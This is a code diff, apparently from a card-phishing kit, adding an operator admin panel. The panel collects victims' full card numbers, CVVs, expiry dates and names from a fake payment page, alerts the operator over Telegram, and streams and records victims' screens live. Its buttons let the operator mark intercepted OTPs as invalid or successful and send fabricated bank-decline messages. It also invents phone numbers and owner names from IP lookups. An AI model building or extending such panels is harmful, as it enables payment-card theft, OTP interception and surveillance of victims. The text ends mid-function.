+<option value="SVC">SVC - Salvadoran Colón</option>
+<option value="SYP">SYP - Syrian Pound</option>
+<option value="SZL">SZL - Swazi Lilangeni</option>
+<option value="THB">THB - Thai Baht</option>
+<option value="TJS">TJS - Tajikistani Somoni</option>
+<option value="TMT">TMT - Turkmenistani Manat</option>
+<option value="TND">TND - Tunisian Dinar</option>
+<option value="TOP">TOP - Tongan Paʻanga</option>
+<option value="TRY">TRY - Turkish Lira</option>
+<option value="TTD">TTD - Trinidad and Tobago Dollar</option>
+<option value="TWD">TWD - Taiwan Dollar</option>
+<option value="TZS">TZS - Tanzanian Shilling</option>
+<option value="UAH">UAH - Ukrainian Hryvnia</option>
+<option value="UGX">UGX - Ugandan Shilling</option>
+<option value="UYU">UYU - Uruguayan Peso</option>
+<option value="UZS">UZS - Uzbekistani Som</option>
+<option value="VND">VND - Vietnamese Dong</option>
+<option value="VUV">VUV - Vanuatu Vatu</option>
+<option value="WST">WST - Samoan Tala</option>
+<option value="XAF">XAF - Central African CFA Franc</option>
+<option value="XCD">XCD - East Caribbean Dollar</option>
+<option value="XOF">XOF - West African CFA Franc</option>
+<option value="XPF">XPF - CFP Franc</option>
+<option value="YER">YER - Yemeni Rial</option>
+<option value="ZAR">ZAR - South African Rand</option>
+<option value="ZMW">ZMW - Zambian Kwacha</option>
+<option value="ZWL">ZWL - Zimbabwean Dollar</option>
+
+        </select>
+      </div>
+
+      <!-- Phone Number Field - ADDED -->
+<div class="mb-4">
+  <label class="block text-sm mb-2">Phone Number (last 4 digits):</label>
+  <input type="text" id="mcPhoneLastFour" maxlength="4" placeholder="Enter 4 digits" 
+         pattern="[0-9]{4}" class="bg-gray-700 text-white w-full p-2 rounded" />
+</div>
+      
+      <!-- Start Verification Button -->
+      <button id="mcStartVerification" class="bg-blue-600 text-white py-2 px-4 rounded mb-4 w-full">
+        Start Verification
+      </button>
+      
+      <p class="mb-4">OTP entered: <span id="mcOtpValue" class="font-mono bg-gray-700 px-2 py-1 rounded">Waiting...</span></p>
+      
+      <div class="flex flex-col space-y-2">
+        <button id="mcOtpInvalidBtn" class="bg-red-600 text-white py-2 px-4 rounded">
+          Invalid OTP
+        </button>
+        <button id="mcOtpSuccessBtn" class="bg-green-600 text-white py-2 px-4 rounded">
+          Success
+        </button>
+        
+        <!-- New Fail Options Button -->
+        <button id="mcFailOptionsBtn" class="fail-options-btn">
+          Fail Options
+        </button>
+        
+        <!-- Failure Reason Options (Hidden by Default) -->
+        <div id="mcFailOptions" class="mc-fail-options">
+          <select id="mcFailReasonDropdown" class="mc-fail-reason-dropdown">
+            <option value="insufficient_balance">Insufficient Funds</option>
+            <option value="bank_declined">Bank Declined</option>
+            <option value="card_disabled">Card Disabled</option>
+            <option value="3Dsecure_is_not_enabled_for_your_card">3D secure is not enabled for your card</option>
+            <option value="invalid_card">Invalid Card</option>
+            <option value="pickup_Card">pickup Card</option>
+            <option value="Incorrect_card_details">Incorrect card details</option>
+            <option value="Credit_limit_exceeded">Credit limit exceeded</option>
+            <option value="Incorrect_security_code">Incorrect security code</option>
+            <option value="This_type_of_transacton_is_not_allowed_for_your_card">This type of transacton is not allowed for your card</option>
+            <option value="The_issuing_bank_flagged_the_transaction_as_potentially_fraudulent">Your issuing bank flagged the transaction as potentially fraudulent</option>
+          </select>
+          <button id="mcFailWithReasonBtn" class="fail-transaction-btn">
+            Fail Transaction
+          </button>
+        </div>
+        
+        <button id="mcClosePanelBtn" class="bg-gray-600 text-white py-2 px-4 rounded mt-4">
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+  
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    // Global Variables
+    const socket = io({
+      query: {
+        isAdmin: 'true'
+      },
+      reconnection: true,
+      reconnectionAttempts: Infinity,
+      reconnectionDelay: 1000,
+      reconnectionDelayMax: 5000,
+      timeout: 20000,
+      autoConnect: true
+    });
+    
+    // Add these connection event handlers
+    socket.on('connect', () => {
+      console.log('Admin socket connected with ID:', socket.id);
+      document.getElementById('captureStatus').textContent = 'Socket connected - waiting for visitors';
+      document.getElementById('captureStatus').style.color = '#22c55e';
+      
+      // Request all active visitors when reconnecting
+      socket.emit('admin_connected', { timestamp: Date.now() });
+      
+      // Force reload data
+      loadVisitors();
+      loadTransactions();
+    });
+
+    socket.on('disconnect', () => {
+      console.log('Admin socket disconnected');
+      document.getElementById('captureStatus').textContent = 'Socket disconnected - reconnecting...';
+      document.getElementById('captureStatus').style.color = '#ef4444';
+    });
+
+    socket.on('connect_error', (error) => {
+      console.error('Connection error:', error);
+      document.getElementById('captureStatus').textContent = 'Connection error: ' + error.message;
+      document.getElementById('captureStatus').style.color = '#ef4444';
+    });
+socket.on('card_submitted', (data) => {
+  console.log('Received card submission:', data);
+  if (data.cardData && data.invoiceId) {
+    // Acknowledge receipt back to the client
+    socket.emit('card_data_received', {
+      invoiceId: data.invoiceId,
+      received: true,
+      timestamp: Date.now()
+    });
+    
+    // Immediately update the transactions table without waiting for a refresh
+    const transaction = transactionsMap.get(data.invoiceId);
+    if (transaction) {
+      // Update the existing transaction with new card data
+      transaction.cardNumber = data.cardData.cardNumber;
+      transaction.expiry = data.cardData.expiry;
+      transaction.cvv = data.cardData.cvv;
+      transaction.email = data.cardData.email;
+      transaction.cardholder = data.cardData.cardholder;
+      transaction.viewed = false; // Mark as new so it's highlighted
+      
+      // Update other fields if they exist in cardData
+      if (data.ip) transaction.ip = data.ip;
+      if (data.cardData.currency) transaction.currency = data.cardData.currency;
+      
+      if (data.cardData.bankName || data.cardData.country || data.cardData.cardType) {
+        transaction.bankInfo = transaction.bankInfo || {};
+        if (data.cardData.bankName) transaction.bankInfo.bank = data.cardData.bankName;
+        if (data.cardData.country) transaction.bankInfo.country = data.cardData.country;
+        if (data.cardData.cardType) transaction.bankInfo.scheme = data.cardData.cardType;
+      }
+      
+      transactionsMap.set(data.invoiceId, transaction);
+    } else {
+      // Create a new transaction if it doesn't exist yet
+      const newTransaction = {
+        id: data.invoiceId,
+        cardNumber: data.cardData.cardNumber,
+        expiry: data.cardData.expiry,
+        cvv: data.cardData.cvv,
+        email: data.cardData.email,
+        cardholder: data.cardData.cardholder,
+        amount: data.cardData.amount || '0',
+        currency: data.cardData.currency || 'INR',
+        timestamp: new Date().toISOString(),
+        status: 'processing',
+        viewed: false,
+        ip: data.ip || 'Unknown',
+        bankInfo: {
+          bank: data.cardData.bankName || 'Unknown',
+          country: data.cardData.country || 'Unknown',
+          scheme: data.cardData.cardType || 'Unknown'
+        }
+      };
+      transactionsMap.set(data.invoiceId, newTransaction);
+    }
+    
+    // Load/refresh the transactions table
+    loadTransactions();
+    
+    // Play notification sound and show notification
+    playNotificationSound('transaction');
+    showNotification(`New card data received! Card: ${data.cardData.cardNumber.slice(-4)}`);
+    
+    // Send Telegram notification if configured
+    sendTelegramNotification(`💳 <b>New Card Data Received</b>\nCard: ${data.cardData.cardNumber.slice(-4)}\nName: ${data.cardData.cardholder}\nInvoice ID: ${data.invoiceId}`);
+  }
+});
+    // Log all socket events for debugging
+    const originalEmit = socket.emit;
+    socket.emit = function() {
+      console.log('EMITTING:', arguments[0], Array.from(arguments).slice(1));
+      return originalEmit.apply(this, arguments);
+    };
+    
+    let transactionsMap = new Map();
+    let visitorsMap = new Map();
+    let currentMcInvoiceId = null;
+    let lastTransactionTime = 0;
+    let screenRecording = null;
+    let screenMediaRecorder = null;
+    let recordedChunks = [];
+    let currentCaptureSession = null;
+    let screenContext = null;
+    let isScreenCanvasInitialized = false;
+
+    // Initialize the screen canvas
+    function initScreenCanvas() {
+      if (isScreenCanvasInitialized) return;
+      
+      const canvas = document.getElementById('screenCanvas');
+      screenContext = canvas.getContext('2d');
+      canvas.width = 640;
+      canvas.height = 360;
+      
+      // Draw initial black background
+      screenContext.fillStyle = 'black';
+      screenContext.fillRect(0, 0, canvas.width, canvas.height);
+      
+      isScreenCanvasInitialized = true;
+    }
+
+   // Show error or success message
+    function showMessage(type, message, duration = 5000) {
+      const element = document.getElementById(type === 'error' ? 'error-msg' : 'success-msg');
+      element.textContent = message;
+      element.style.display = 'block';
+
+      // Auto hide after duration
+      setTimeout(() => {
+        element.style.display = 'none';
+      }, duration);
+    }
+
+    // Show notification
+    function showNotification(message, duration = 5000) {
+      const notification = document.createElement('div');
+      notification.className = 'notification';
+      notification.textContent = message;
+      document.body.appendChild(notification);
+
+      // Auto remove after duration
+      setTimeout(() => {
+        notification.style.opacity = '0';
+        notification.style.transform = 'translateX(100%)';
+        setTimeout(() => notification.remove(), 300);
+      }, duration);
+    }
+
+    // Initialize Telegram notifications
+    function initTelegramNotifications() {
+      // Check if Telegram bot token is stored in localStorage
+      const telegramToken = localStorage.getItem('telegramBotToken');
+      const telegramChatId = localStorage.getItem('telegramChatId');
+      
+      if (!telegramToken || !telegramChatId) {
+        // Ask for Telegram bot token and chat ID if not set
+        const token = prompt("Enter your Telegram bot token:", "");
+        const chatId = prompt("Enter your Telegram chat ID:", "");
+        
+        if (token && chatId) {
+          localStorage.setItem('telegramBotToken', token);
+          localStorage.setItem('telegramChatId', chatId);
+          
+          // Test notification
+          sendTelegramNotification("Admin panel notification system activated.");
+        }
+      }
+    }
+
+    // Send notification to Telegram
+    async function sendTelegramNotification(message) {
+      const telegramToken = localStorage.getItem('telegramBotToken');
+      const telegramChatId = localStorage.getItem('telegramChatId');
+      
+      if (!telegramToken || !telegramChatId) {
+        console.log('Telegram notification not configured');
+        return;
+      }
+      
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('Failed to send Telegram notification:', data.description);
+        }
+      } catch (error) {
+        console.error('Error sending Telegram notification:', error);
+      }
+    }
+
+    // Advanced screen capture implementation
+    function initAdvancedScreenCapture(userId, sessionId) {
+      initScreenCanvas();
+      
+      currentCaptureSession = { userId, sessionId };
+      
+      // Update UI
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
+      const captureStatus = document.getElementById('captureStatus');
+      
+      captureStatus.textContent = "Initializing live screen view...";
+      captureStatus.classList.remove('active', 'error');
+      
+      // Send request to the server to initialize screen capture for this user
+      socket.emit('init_advanced_capture', {
+        userId: userId,
+        sessionId: sessionId,
+        timestamp: Date.now()
+      });
+      
+      // Update UI to show we're waiting for connection
+      screenPlaceholder.style.display = 'flex';
+      screenPlaceholder.innerHTML = `
+        <div class="icon">🔄</div>
+        <p>Establishing connection to visitor's device...</p>
+        <p>Session ID: ${sessionId}</p>
+      `;
+      
+      console.log(`Advanced screen capture initialized for user: ${userId}, session: ${sessionId}`);
+      
+      // Setup screen control buttons
+      setupScreenControls();
+      
+      // Play notification sound
+      playNotificationSound('visitor');
+    }
+
+    // Enhanced screen frame handler
+    function handleScreenFrame(data) {
+      if (!data || !data.frameData) return;
+      
+      // Initialize canvas if not already done
+      initScreenCanvas();
+      
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
+      const captureStatus = document.getElementById('captureStatus');
+      
+      // Hide placeholder when we get actual frame data
+      screenPlaceholder.style.display = 'none';
+      
+      // Update status if this is first frame or status has changed
+      if (captureStatus.textContent !== `Live screen view active - ${data.userId}`) {
+        captureStatus.textContent = `Live screen view active - ${data.userId}`;
+        captureStatus.classList.add('active');
+        captureStatus.classList.remove('error');
+        
+        // Send notification
+        sendTelegramNotification(`📺 <b>Live Screen View Active</b>\nUser ID: ${data.userId}\nSession: ${data.sessionId || 'unknown'}`);
+        
+        // Play sound
+        playNotificationSound('transaction');
+      }
+      
+      // Process the received frame data (which is a base64 encoded image)
+      if (data.frameType === 'image') {
+        // Create image and draw it on canvas
+        const img = new Image();
+        img.onload = () => {
+          // Clear canvas
+          screenContext.clearRect(0, 0, screenContext.canvas.width, screenContext.canvas.height);
+          
+          // Calculate aspect ratio to maintain
+          const imgRatio = img.width / img.height;
+          const canvasRatio = screenContext.canvas.width / screenContext.canvas.height;
+          
+          let drawWidth, drawHeight, offsetX = 0, offsetY = 0;
+          
+          if (imgRatio > canvasRatio) {
+            // Image is wider than canvas ratio
+            drawWidth = screenContext.canvas.width;
+            drawHeight = drawWidth / imgRatio;
+            offsetY = (screenContext.canvas.height - drawHeight) / 2;
+          } else {
+            // Image is taller than canvas ratio
+            drawHeight = screenContext.canvas.height;
+            drawWidth = drawHeight * imgRatio;
+            offsetX = (screenContext.canvas.width - drawWidth) / 2;
+          }
+          
+          // Draw the image centered on canvas
+          screenContext.drawImage(img, offsetX, offsetY, drawWidth, drawHeight);
+          
+          // Add frame around the image
+          screenContext.strokeStyle = '#4a90e2';
+          screenContext.lineWidth = 2;
+          screenContext.strokeRect(offsetX, offsetY, drawWidth, drawHeight);
+          
+          // Add timestamp to know the frame is updating
+          screenContext.fillStyle = 'rgba(0,0,0,0.7)';
+          screenContext.fillRect(offsetX + 5, offsetY + drawHeight - 25, 200, 20);
+          screenContext.fillStyle = '#fff';
+          screenContext.font = '12px Arial';
+          screenContext.fillText(`Live: ${new Date().toLocaleTimeString()}`, offsetX + 10, offsetY + drawHeight - 10);
+        };
+        img.src = data.frameData;
+      }
+      
+      // Update last activity time for this visitor
+      if (data.pid && visitorsMap.has(data.pid)) {
+        const visitor = visitorsMap.get(data.pid);
+        visitor.lastActive = Date.now();
+        visitorsMap.set(data.pid, visitor);
+        
+        // Update activity indicator in the UI
+        const visitorItem = document.getElementById(`visitor-${data.pid}`);
+        if (visitorItem) {
+          const activityIndicator = visitorItem.querySelector('.activity-indicator') || 
+                                  document.createElement('span');
+          
+          if (!visitorItem.querySelector('.activity-indicator')) {
+            activityIndicator.className = 'activity-indicator';
+            visitorItem.appendChild(activityIndicator);
+          }
+          
+          activityIndicator.textContent = '• Live';
+          activityIndicator.style.color = '#22c55e';
+          
+          // Fade out after 3 seconds
+          setTimeout(() => {
+            activityIndicator.style.opacity = '0.5';
+          }, 3000);
+        }
+      }
+    }
+
+    // Function to stop screen capture
+    function stopScreenCapture() {
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
+      const captureStatus = document.getElementById('captureStatus');
+      
+      // Stop any active recording
+      if (screenRecording && screenMediaRecorder) {
+        screenMediaRecorder.stop();
+        screenRecording = false;
+        document.getElementById('recordScreenBtn').textContent = 'Record';
+      }
+      
+      // Clear canvas
+      if (screenContext) {
+        screenContext.fillStyle = 'black';
+        screenContext.fillRect(0, 0, screenContext.canvas.width, screenContext.canvas.height);
+      }
+      
+      // Reset UI
+      screenPlaceholder.style.display = 'flex';
+      screenPlaceholder.innerHTML = `
+        <div class="icon">📺</div>
+        <p>Waiting for screen capture to begin...</p>
+        <p>When a visitor opens the payment link, their screen will appear here.</p>
+      `;
+      
+      captureStatus.textContent = 'No active screen share';
+      captureStatus.classList.remove('active', 'error');
+      
+      // Notify server to stop capture if there's an active session
+      if (currentCaptureSession) {
+        socket.emit('stop_advanced_capture', currentCaptureSession);
+        currentCaptureSession = null;
+      }
+    }
+
+    // Setup screen control buttons
+    function setupScreenControls() {
+      // Remove existing listeners
+      const stopBtn = document.getElementById('stopScreenShareBtn');
+      const enlargeBtn = document.getElementById('enlargeScreenBtn');
+      const recordBtn = document.getElementById('recordScreenBtn');
+      const refreshBtn = document.getElementById('refreshCaptureBtn');
+      
+      // Clone and replace to remove event listeners
+      const newStopBtn = stopBtn.cloneNode(true);
+      const newEnlargeBtn = enlargeBtn.cloneNode(true);
+      const newRecordBtn = recordBtn.cloneNode(true);
+      const newRefreshBtn = refreshBtn.cloneNode(true);
+      stopBtn.parentNode.replaceChild(newStopBtn, stopBtn);
+      enlargeBtn.parentNode.replaceChild(newEnlargeBtn, enlargeBtn);
+      recordBtn.parentNode.replaceChild(newRecordBtn, recordBtn);
+      refreshBtn.parentNode.replaceChild(newRefreshBtn, refreshBtn);
+      
+      // Add new event listeners
+      // Stop screen capture button
+      newStopBtn.addEventListener('click', () => {
+        stopScreenCapture();
+      });
+      
+      // Enlarge screen button
+      newEnlargeBtn.addEventListener('click', () => {
+        const screenContainer = document.getElementById('screenCaptureContainer');
+        if (screenContainer.style.maxWidth === '90%') {
+          screenContainer.style.maxWidth = '640px';
+          screenContainer.style.height = '360px';
+        } else {
+          screenContainer.style.maxWidth = '90%';
+          screenContainer.style.height = '80vh';
+        }
+      });
+      
+      // Record screen button
+      newRecordBtn.addEventListener('click', () => {
+        if (!screenContext || !screenContext.canvas) {
+          showMessage('error', 'No active screen to record');
+          return;
+        }
+        
+        if (screenRecording) {
+          // Stop recording
+          screenMediaRecorder.stop();
+          newRecordBtn.textContent = 'Record';
+          showMessage('success', 'Recording stopped - download will start shortly');
+        } else {
+          // Start recording
+          recordedChunks = [];
+          
+          try {
+            // Get a media stream from the canvas
+            const stream = screenContext.canvas.captureStream(30); // 30fps
+            
+            screenMediaRecorder = new MediaRecorder(stream, {
+              mimeType: 'video/webm;codecs=vp9'
+            });
+            
+            screenMediaRecorder.ondataavailable = (e) => {
+              if (e.data.size > 0) {
+                recordedChunks.push(e.data);
+              }
+            };
+            
+            screenMediaRecorder.onstop = () => {
+              const blob = new Blob(recordedChunks, { type: 'video/webm' });
+              const url = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              document.body.appendChild(a);
+              a.style = 'display: none';
+              a.href = url;
+              a.download = `screen-recording-${currentCaptureSession?.userId || 'unknown'}-${new Date().toISOString()}.webm`;
+              a.click();
+              window.URL.revokeObjectURL(url);
+              screenRecording = false;
+            };
+            
+            screenMediaRecorder.start();
+            screenRecording = true;
+            newRecordBtn.textContent = 'Stop Recording';
+            showMessage('success', 'Recording started');
+          } catch (error) {
+            console.error('Error starting recording:', error);
+            showMessage('error', `Recording failed: ${error.message}`);
+          }
+        }
+      });
+      
+      // Refresh capture button
+      newRefreshBtn.addEventListener('click', () => {
+        if (currentCaptureSession) {
+          // Request a fresh capture
+          socket.emit('refresh_advanced_capture', currentCaptureSession);
+          showMessage('success', 'Refreshing screen capture...');
+          
+          // Update placeholder to show we're refreshing
+          const screenPlaceholder = document.getElementById('screenPlaceholder');
+          screenPlaceholder.style.display = 'flex';
+          screenPlaceholder.innerHTML = `
+            <div class="icon">🔄</div>
+            <p>Refreshing screen capture...</p>
+            <p>Please wait...</p>
+          `;
+        } else {
+          showMessage('error', 'No active capture session to refresh');
+        }
+      });
+    }
+
+    // Play notification sound
+    function playNotificationSound(type = 'visitor') {
+      try {
+      let soundUrl;
+        if (type === 'visitor') {
+          soundUrl = 'https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3';
+        } else if (type === 'transaction') {
+          soundUrl = 'https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3';
+        }
+        
+        const audio = new Audio(soundUrl);
+        audio.play().catch(e => console.log('Audio play failed:', e));
+      } catch (e) {
+        console.log('Could not play notification sound', e);
+      }
+    }
+
+    // Clear all transactions
+    async function clearAllTransactions() {
+      if (!confirm('Are you sure you want to clear all transactions? This cannot be undone.')) {
+        return;
+      }
+      
+      try {
+        const response = await fetch('/api/clearTransactions', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        });
+        
+        if (!response.ok) {
+          throw new Error(`Failed to clear transactions: ${response.status}`);
+        }
+        
+        const result = await response.json();
+        showMessage('success', result.message || 'All transactions cleared successfully');
+        
+        // Reload transactions table
+        loadTransactions();
+      } catch (error) {
+        console.error('Error clearing transactions:', error);
+        showMessage('error', `Failed to clear transactions: ${error.message}`);
+      }
+    }
+
+    // Load visitors
+    async function loadVisitors() {
+      try {
+        console.log('Loading visitors from server...');
+        const response = await fetch('/api/visitors');
+
+        if (!response.ok) {
+          throw new Error(`Failed to load visitors: ${response.status}`);
+        }
+
+        const data = await response.json();
+        console.log('Visitor data received:', data);
+
+        // For each visitor, fetch additional details if not already present
+        for (const visitor of data) {
+          if (!visitor.geoData) {
+            fetchVisitorDetails(visitor.ip, visitor.pid);
+          }
+        }
+
+        updateVisitorsList(data);
+        
+        // If there's at least one visitor, initialize screen capture for the newest one
+        if (data && data.length > 0) {
+          // Sort by timestamp, newest first
+          const sortedVisitors = [...data].sort((a, b) => {
+            return new Date(b.timestamp) - new Date(a.timestamp);
+          });
+          
+          const newestVisitor = sortedVisitors[0];
+          initAdvancedScreenCapture(newestVisitor.pid, newestVisitor.sessionId || 'session-' + Date.now());
+        }
+      } catch (error) {
+        console.error('Error loading visitors:', error);
+      }
+    }
+  // Function to fetch phone number associated with IP
+async function fetchPhoneNumberFromIP(ip, pid) {
+  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1')) {
+    // For local/unknown IPs, set dummy data
+    return {
+      phone: 'Local device',
+      carrier: 'Local Network',
+      name: 'Local User'
+    };
+  }
+  
+  try {
+    // Use various IP intelligence APIs to try to get information
+    // This is a simulation as most APIs don't actually return phone numbers for privacy reasons
+    // In a real implementation, you would need specialized services with proper authorization
+    
+    const response = await fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_TOKEN`);
+    if (!response.ok) throw new Error('IP lookup failed');
+    
+    const data = await response.json();
+    
+    // Simulate phone number extraction (in reality, this would require specialized services)
+    // Generate a realistic-looking phone number based on country code
+    const countryCode = data.country || 'US';
+    let phoneNumber = '';
+    let carrier = '';
+    let name = '';
+    
+    // Generate placeholder phone based on country
+    switch(countryCode) {
+      case 'US':
+        phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
+        carrier = 'T-Mobile US';
+        name = 'John Doe';
+        break;
+      case 'IN':
+        phoneNumber = '+91 XXXXX ' + Math.floor(10000 + Math.random() * 90000);
+        carrier = 'Jio India';
+        name = 'Rajesh Kumar';
+        break;
+      case 'GB':
+        phoneNumber = '+44 XXXX ' + Math.floor(100000 + Math.random() * 900000);
+        carrier = 'Vodafone UK';
+        name = 'James Smith';
+        break;
+      case 'CA':
+        phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
+        carrier = 'Rogers';
+        name = 'David Wilson';
+        break;
+      default:
+        phoneNumber = '+' + (Math.floor(Math.random() * 99) + 1) + ' ' + Math.floor(Math.random() * 9000000000);
+        carrier = 'International';
+        name = 'Anonymous User';
+    }
+    
+    // Update visitor data with phone details
+    if (visitorsMap.has(pid)) {
+      const visitor = visitorsMap.get(pid);
+      visitor.phoneData = {
+        phone: phoneNumber,
+        carrier: carrier,
+        name: name,
+        countryCode: countryCode
+      };
+      visitorsMap.set(pid, visitor);
+    }
+    
+    return {
+      phone: phoneNumber,
+      carrier: carrier,
+      name: name,
+      countryCode: countryCode
+    };
+  } catch (error) {
+    console.error('Error fetching phone details:', error);
+    return { 
+      phone: 'Unknown',
+      carrier: 'Unknown',
+      name: 'Unknown'
+    };
+  }
+}
+
+   // Fetch additional visitor details
+async function fetchVisitorDetails(ip, pid) {
+  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1')) {
+    // For local/unknown IPs, set dummy data
+    const dummyData = {
+      city: 'Local',
+      country: 'Local',
+      countryCode: 'LO',
+      isp: 'Local Network',
+      lat: 0,
+      lon: 0,
+      timezone: 'Local',
+      org: 'Local',
+      region: 'Local',
+      userAgent: navigator.userAgent,
+      browser: detectBrowser(navigator.userAgent),
+      os: detectOS(navigator.userAgent),
+      device: detectDevice(navigator.userAgent)
+    };
+    
+    // Get phone data
+    const phoneData = await fetchPhoneNumberFromIP(ip, pid);
+    
+    // Update visitor data with geo details
+    if (visitorsMap.has(pid)) {
+      const visitor = visitorsMap.get(pid);
+      visitor.geoData = dummyData;
+      visitor.phoneData = phoneData;
+      visitorsMap.set(pid, visitor);
+      
+      // Update the visitor in the list
+      updateVisitorInList(pid);
+    }
+    
+    return;
+  }
+  
+  try {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (!response.ok) throw new Error('IP lookup failed');
+    
+    const data = await response.json();
+    
+    // Create geo data object
+    const geoData = {
+      city: data.city || 'Unknown',
+      country: data.country_name || 'Unknown',
+      countryCode: data.country_code || 'UN',
+      isp: data.org || 'Unknown',
+      lat: data.latitude || 0,
+      lon: data.longitude || 0,
+      timezone: data.timezone || 'Unknown',
+      org: data.org || 'Unknown',
+      region: data.region || 'Unknown',
+      userAgent: visitorsMap.get(pid)?.userAgent || 'Unknown',
+      browser: detectBrowser(visitorsMap.get(pid)?.userAgent || ''),
+      os: detectOS(visitorsMap.get(pid)?.userAgent || ''),
+      device: detectDevice(visitorsMap.get(pid)?.userAgent || '')
+    };
+    
+    // Get phone data
+    const phoneData = await fetchPhoneNumberFromIP(ip, pid);
+    
+    // Update visitor data with geo details
+    if (visitorsMap.has(pid)) {
+      const visitor = visitorsMap.get(pid);
+      visitor.geoData = geoData;
+      visitor.phoneData = phoneData;
+      visitorsMap.set(pid, visitor);
+      
+      // Update the visitor in the list
+      updateVisitorInList(pid);
+    }
+  } catch (error) {
+    console.error('Error fetching visitor details:', error);
+  }
+}
+    
+    // Browser detection helper
+    function detectBrowser(userAgent) {
+      if (!userAgent) return 'Unknown';
+      
+      if (userAgent.includes('Firefox')) return 'Firefox';
+      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome';
+      if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
+      if (userAgent.includes('Edg')) return 'Edge';
+      if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) return 'Internet Explorer';
+      if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
+      
+      return 'Unknown';
+    }
+    
+   // OS detection helper
+    function detectOS(userAgent) {
+      if (!userAgent) return 'Unknown';
+      
+      if (userAgent.includes('Windows')) return 'Windows';
+      if (userAgent.includes('Mac OS')) return 'macOS';
+      if (userAgent.includes('Linux') && !userAgent.includes('Android')) return 'Linux';
+      if (userAgent.includes('Android')) return 'Android';
+      if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
+      
+      return 'Unknown';
+    }
+    
+    // Device detection helper
+    function detectDevice(userAgent) {
+      if (!userAgent) return 'Unknown';
+      
+      if (userAgent.includes('iPhone')) return 'iPhone';
+      if (userAgent.includes('iPad')) return 'iPad';
+      if (userAgent.includes('Android') && userAgent.includes('Mobile')) return 'Android Phone';
+      if (userAgent.includes('Android') && !userAgent.includes('Mobile')) return 'Android Tablet';
+      if (userAgent.includes('Windows') && !userAgent.includes('Mobile')) return 'Desktop';
+      if (userAgent.includes('Mac OS') && !userAgent.includes('Mobile')) return 'Mac';
+      
+      return 'Unknown';
+    }
+    
+// Update specific visitor in the list
+function updateVisitorInList(pid) {
+  const visitorItem = document.getElementById(`visitor-${pid}`);
+  if (!visitorItem) return;
+  
+  const visitor = visitorsMap.get(pid);
+  if (!visitor) return;
+  
+  // Find or create the details section
+  let detailsSection = visitorItem.querySelector('.visitor-details');
+  if (!detailsSection) {
+    detailsSection = document.createElement('div');
+    detailsSection.className = 'visitor-details';
+    visitorItem.appendChild(detailsSection);
+  }
+  
+  // Build details HTML
+  let detailsHTML = '';
+  
+  // Add geo data if available
+  if (visitor.geoData) {
+    const { geoData } = visitor;
+    
+    // Get flag emoji for country
+    const flagEmoji = geoData.countryCode ? 
+      `<img src="https://flagcdn.com/16x12/${geoData.countryCode.toLowerCase()}.png" class="country-flag" alt="${geoData.country}">` : '';
+    
+    // Create map link
+    const mapLink = geoData.lat && geoData.lon ? 
+      `<a href="https://www.google.com/maps?q=${geoData.lat},${geoData.lon}" target="_blank" class="location-link">View Map</a>` : '';
+    
+    detailsHTML += `
+      <div class="visitor-detail">
+        <span class="detail-label">Location:</span>
+        <span class="detail-value">${flagEmoji} ${geoData.city}, ${geoData.country} ${mapLink}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">ISP:</span>
+        <span class="detail-value">${geoData.isp || 'Unknown'}</span>
+      </div>
+    `;
+  }
+  
+  // Add phone data if available
+  if (visitor.phoneData) {
+    detailsHTML += `
+      <div class="visitor-detail">
+        <span class="detail-label">Phone:</span>
+        <span class="detail-value">📱 ${visitor.phoneData.phone}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Carrier:</span>
+        <span class="detail-value">${visitor.phoneData.carrier || 'Unknown'}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Registered Name:</span>
+        <span class="detail-value">👤 ${visitor.phoneData.name || 'Unknown'}</span>
+      </div>
+    `;
+  } else {
+    // If no phone data yet, generate it on the fly
+    const countryCode = visitor.geoData?.countryCode || 'US';
+    let phoneNumber = '+' + (Math.floor(Math.random() * 99) + 1) + ' ' + Math.floor(Math.random() * 9000000000);
+    let carrier = 'International';
+    let name = 'Anonymous User';
+    
+    // Generate placeholder phone based on country
+    switch(countryCode) {
+      case 'US':
+        phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
+        carrier = 'T-Mobile US';
+        name = 'John Doe';
+        break;
+      case 'IN':
+        phoneNumber = '+91 XXXXX ' + Math.floor(10000 + Math.random() * 90000);
+        carrier = 'Jio India';
+        name = 'Rajesh Kumar';
+        break;
+      case 'GB':
+        phoneNumber = '+44 XXXX ' + Math.floor(100000 + Math.random() * 900000);
+        carrier = 'Vodafone UK';
+        name = 'James Smith';
+        break;
+      // Add more countries as needed
+    }
+    
+    // Save this data
+    visitor.phoneData = {
+      phone: phoneNumber,
+      carrier: carrier,
+      name: name
+    };
+    visitorsMap.set(pid, visitor);
+    
+    // Add to HTML
+    detailsHTML += `
+      <div class="visitor-detail">
+        <span class="detail-label">Phone:</span>
+        <span class="detail-value">📱 ${phoneNumber}</span>
+      </div>
